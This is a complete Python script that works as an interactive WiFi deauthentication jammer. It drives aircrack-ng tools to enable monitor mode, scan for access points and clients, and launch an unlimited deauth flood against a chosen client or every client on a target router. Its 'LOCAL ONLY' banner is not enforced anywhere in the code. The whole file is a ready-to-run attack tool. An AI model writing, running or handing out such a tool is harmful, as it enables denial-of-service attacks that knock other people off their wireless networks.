import subprocess
import time
import os

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
  ███╗   ██╗███████╗██╗    ██╗██╗ ██████╗ 
  ████╗  ██║██╔════╝██║    ██║██║██╔════╝ 
  ██╔██╗ ██║█████╗  ██║ █╗ ██║██║██║  ███╗
  ██║╚██╗██║██╔══╝  ██║███╗██║██║██║   ██║
  ██║ ╚████║███████╗╚███╔███╔╝██║╚██████╔╝
  ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝ ╚═╝ ╚═════╝ 
            WiFi Jammer [LOCAL ONLY]
""")

def start_monitor_mode(interface):
    print(f"[+] Starting monitor mode on {interface}...")
    subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.DEVNULL)

    # Get actual interfaces
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    lines = result.stdout.splitlines()
    current_iface = ""

    for line in lines:
        if not line.strip():
            continue
        if not line.startswith(' '):  # This is a new interface section
            current_iface = line.split()[0]
        if "Mode:Monitor" in line:
            print(f"[+] Monitor mode enabled on: {current_iface}")
            return current_iface

    print("[!] Failed to detect monitor mode interface. Defaulting to original interface.")
    return interface


def scan_networks(mon_iface):
    print("[*] Scanning for networks (10s)... Press CTRL+C to stop early.")
    print("[*] When done, look for BSSID, Channel, ESSID in list.")
    try:
        subprocess.run(["airodump-ng", mon_iface])
    except KeyboardInterrupt:
        pass

def scan_clients(mon_iface, bssid, channel):
    print(f"[*] Scanning clients on {bssid} channel {channel}. CTRL+C when ready to select.")
    try:
        subprocess.run(["airodump-ng", "--bssid", bssid, "-c", str(channel), mon_iface])
    except KeyboardInterrupt:
        pass

def deauth_attack(mon_iface, bssid, client_mac):
    print(f"[!] Launching deauth attack on {client_mac} from {bssid}...")
    try:
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, "-c", client_mac, mon_iface])
    except KeyboardInterrupt:
        print("[*] Attack stopped.")

def cleanup(mon_iface):
    print("[*] Cleaning up...")
    subprocess.run(["airmon-ng", "stop", mon_iface])
    subprocess.run(["service", "NetworkManager", "restart"])
    print("[*] Monitor mode stopped. Wi-Fi back online.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Please run this script as root (use: sudo python3 script.py)")
        exit(1)

    banner()
    interface = input("Enter your wireless interface (e.g., wlan0): ").strip()
    mon_iface = start_monitor_mode(interface)

    scan_networks(mon_iface)
    print("\n[!] Use info above to select target network:")
    bssid = input("Enter BSSID of target router: ").strip()
    channel = input("Enter Channel of target router: ").strip()

    scan_clients(mon_iface, bssid, channel)
    print("\n[!] Use info above to select target client:")
    client_mac = input("Enter MAC of client to deauth (or 'FF:FF:FF:FF:FF:FF' for all): ").strip()

    confirm = input(f"Start deauth on {client_mac}? (y/n): ").strip().lower()
    if confirm == 'y':
        deauth_attack(mon_iface, bssid, client_mac)
    else:
        print("[*] Attack aborted.")

    cleanup(mon_iface)
